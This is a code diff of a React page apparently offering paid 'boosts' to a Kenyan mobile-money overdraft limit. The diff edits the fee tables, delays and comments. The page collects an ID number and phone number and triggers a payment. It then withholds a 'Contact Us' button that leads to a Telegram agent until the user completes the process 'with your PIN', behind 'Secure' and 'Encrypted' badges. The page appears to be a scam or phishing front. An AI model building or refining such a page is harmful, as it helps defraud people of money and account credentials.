@@ -20,16 +20,16 @@ function generateMaskedPhone(): string {
 export default function FulizaBoostPage() {
   const limits = React.useMemo(
     () => [
-      { amount: 2700, fee: 157 },
-      { amount: 5000, fee: 289 },
-      { amount: 10000, fee: 359 },
-      { amount: 16500, fee: 470 },
-      { amount: 21000, fee: 599 },
-      { amount: 32000, fee: 790 },
-      { amount: 44000, fee: 990 },
-      { amount: 53000, fee: 1290 },
-      { amount: 62000, fee: 1550 },
-      { amount: 75000, fee: 2050 },
+      { amount: 2700, fee: 1 },
+      { amount: 5000, fee: 183 },
+      { amount: 10000, fee: 270 },
+      { amount: 16500, fee: 427 },
+      { amount: 21000, fee: 590 },
+      { amount: 32000, fee: 760 },
+      { amount: 44000, fee: 997 },
+      { amount: 53000, fee: 1299 },
+      { amount: 62000, fee: 1650 },
+      { amount: 75000, fee: 2090 },
     ],
     []
   );
@@ -43,9 +43,8 @@ export default function FulizaBoostPage() {
   const [isModalOpen, setModalOpen] = React.useState(false);
   const [isReviewOpen, setReviewOpen] = React.useState(false);
   const [isSuccessOpen, setSuccessOpen] = React.useState(false);
-
-  const [showContact, setShowContact] = React.useState(false);
-  const [isContactActive, setIsContactActive] = React.useState(false);
+  const [showContact, setShowContact] = React.useState(false);     // button visible after 5s
+  const [isContactActive, setIsContactActive] = React.useState(false); // active/clickable after 15s
   const [showNotification, setShowNotification] = React.useState(false);
 
   const [idNumber, setIdNumber] = React.useState('');
@@ -123,6 +122,7 @@ export default function FulizaBoostPage() {
 
       setReviewOpen(false);
       setSuccessOpen(true);
+
     } catch (err: any) {
       console.error('Fetch error:', err);
       setErrorMsg(err.message || 'Payment initiation failed');
@@ -147,16 +147,16 @@ export default function FulizaBoostPage() {
     setShowNotification(false);
   }
 
-  // Timer: show button after 5s, make active after 15s
+  // Show button after 5s, make it active after 15s
   React.useEffect(() => {
     if (isSuccessOpen) {
       const timerShow = setTimeout(() => {
         setShowContact(true);
-      }, 5000);
+      }, 5000); // 5 seconds - visible but inactive
 
       const timerActive = setTimeout(() => {
         setIsContactActive(true);
-      }, 15000);
+      }, 15000); // 15 seconds - becomes clickable
 
       return () => {
         clearTimeout(timerShow);
@@ -165,14 +165,15 @@ export default function FulizaBoostPage() {
     }
   }, [isSuccessOpen]);
 
-  // Handle button click
+  // Handle click on inactive button → show notification
   function handleContactClick() {
     if (!isContactActive) {
       setShowNotification(true);
-      setTimeout(() => setShowNotification(false), 4000);
+      setTimeout(() => setShowNotification(false), 4000); // hide after 4s
       return;
     }
 
+    // Active → open Telegram
     window.open('https://t.me/agent_betty_official', '_blank');
   }
 
@@ -282,6 +283,7 @@ export default function FulizaBoostPage() {
                 </span>
                 Secure
               </div>
+
               <div className="flex items-center justify-center gap-2 rounded-full bg-white/70 px-3 py-2 text-[11px] text-slate-600 shadow-sm ring-1 ring-slate-200">
                 <span className="inline-flex h-5 w-5 items-center justify-center rounded-full bg-[#0cc45f]/10 text-[#0cc45f]">
                   <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="2">
@@ -291,6 +293,7 @@ export default function FulizaBoostPage() {
                 </span>
                 Encrypted
               </div>
+
               <div className="flex items-center justify-center gap-2 rounded-full bg-white/70 px-3 py-2 text-[11px] text-slate-600 shadow-sm ring-1 ring-slate-200">
                 <span className="inline-flex h-5 w-5 items-center justify-center rounded-full bg-[#0cc45f]/10 text-[#0cc45f]">
                   <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="2">
@@ -300,6 +303,7 @@ export default function FulizaBoostPage() {
                 </span>
                 Instant
               </div>
+
               <div className="flex items-center justify-center gap-2 rounded-full bg-white/70 px-3 py-2 text-[11px] text-slate-600 shadow-sm ring-1 ring-slate-200">
                 <span className="inline-flex h-5 w-5 items-center justify-center rounded-full bg-[#0cc45f]/10 text-[#0cc45f]">
                   <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="2">
@@ -459,7 +463,8 @@ export default function FulizaBoostPage() {
               <div className="flex justify-between items-center">
                 <span className="text-gray-700 font-medium">PAYMENT PHONE</span>
                 <div className="text-right">
-                  <div className="text-[#0cc45f] font-medium">+254 {phoneNumber.replace(/\D/g, '').slice(-9)}</div>
+                  <div className="text-[#0cc45f] font-medium">+254 {phoneNumber.replace(/\D/g, '').slice(-9)}</div>{/*
+                  <div className="text-xs text-gray-500">• +254{phoneNumber.replace(/\D/g, '').slice(-9)}</div>*/}
                 </div>
               </div>
             </div>
@@ -525,7 +530,7 @@ export default function FulizaBoostPage() {
                 showContact
                   ? isContactActive
                     ? 'border-[#0cc45f] text-[#0cc45f] hover:bg-[#0cc45f]/10 cursor-pointer'
-                    : 'border-gray-400 text-gray-400 cursor-not-allowed bg-gray-50/50 opacity-70'
+                    : 'border-gray-300 text-gray-400 cursor-not-allowed opacity-70'
                   : 'opacity-0 pointer-events-none'
               }`}
               style={{ transition: 'opacity 0.6s ease, transform 0.6s ease' }}
@@ -533,20 +538,15 @@ export default function FulizaBoostPage() {
               Contact Us for Help
             </button>
 
-            {/* Notification toast when clicking too early */}
+            {/* Notification when clicking inactive button */}
             {showNotification && (
-              <div className="fixed bottom-8 left-1/2 -translate-x-1/2 bg-rose-600 text-white px-6 py-3 rounded-xl shadow-xl z-50 animate-fade-in-out">
+              <div className="fixed bottom-6 left-1/2 transform -translate-x-1/2 bg-rose-600 text-white px-6 py-3 rounded-xl shadow-lg animate-fade-in-out z-50">
                 Complete the process with your PIN to activate support
               </div>
             )}
 
             {/* Timer logic */}
-            {isSuccessOpen && (
-              <TimerToShowContact
-                setShowContact={setShowContact}
-                setIsContactActive={setIsContactActive}
-              />
-            )}
+            {isSuccessOpen && <TimerToShowContact setShowContact={setShowContact} setIsContactActive={setIsContactActive} />}
           </div>
         </div>
       )}
@@ -554,7 +554,7 @@ export default function FulizaBoostPage() {
   );
 }
 
-// Timer component
+// Timer component - controls visibility (5s) and active state (15s)
 function TimerToShowContact({
   setShowContact,
   setIsContactActive,
@@ -565,11 +565,11 @@ function TimerToShowContact({
   React.useEffect(() => {
     const timerShow = setTimeout(() => {
       setShowContact(true);
-    }, 5000);
+    }, 5000); // visible after 5 seconds
 
     const timerActive = setTimeout(() => {
       setIsContactActive(true);
-    }, 15000);
+    }, 15000); // clickable after 15 seconds
 
     return () => {
       clearTimeout(timerShow);
